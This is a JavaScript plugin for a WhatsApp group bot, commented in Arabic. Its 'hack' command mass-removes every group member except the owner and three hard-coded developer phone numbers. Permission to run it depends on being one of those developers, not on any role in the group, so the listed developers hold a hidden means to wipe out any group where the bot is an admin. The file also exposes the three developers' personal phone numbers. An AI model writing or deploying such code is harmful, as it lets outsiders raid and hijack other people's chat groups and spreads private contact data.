const handler = async (m, { conn, participants, usedPrefix, command }) => { 
    let kickte = `*✳️ الاستخدام الصحيح للأمر*\n*${usedPrefix + command}*`;

    if (!m.isGroup || !m.sender) return m.reply(kickte, m.chat, { mentions: conn.parseMention(kickte) });

    let groupMetadata = await conn.groupMetadata(m.chat); 
    let owner = groupMetadata.owner || m.chat.split('-')[0] + '@s.whatsapp.net';

    // قائمة المطورين الرئيسيين والفرعيين
    let botDevelopers = [ 
        '967781994494@s.whatsapp.net', // المطور الرئيسي
        '967700725811@s.whatsapp.net', // المطور الفرعي 1
        '967776315086@s.whatsapp.net', // المطور الفرعي 2
        // يمكن إضافة المزيد من المطورين الفرعيين هنا
    ];

    // شرط السماح للمطورين الرئيسيين والفرعيين باستخدام الأمر
    if (!botDevelopers.includes(m.sender)) {
        return m.reply('⚠️ أنت لست مطورًا أو ليس لديك صلاحيات لتنفيذ هذا الأمر.');
    }

    let participantsToKick = participants.filter(participant => participant.id !== owner && participant.id !== conn.user.jid && !botDevelopers.includes(participant.id)).map(participant => participant.id);

    // طرد جميع الأعضاء دفعة واحدة
    if (participantsToKick.length > 0) {
        await conn.groupParticipantsUpdate(m.chat, participantsToKick, 'remove');
    }

    m.reply('✅ تم طرد جميع الأعضاء ما عدا المطورين.');
};

handler.help = ['kickall']; 
handler.tags = ['group']; 
handler.command = ['هاك', 'اسحبها']; 
handler.group = true; 
handler.owner = false; 
handler.botAdmin = true;

export default handler;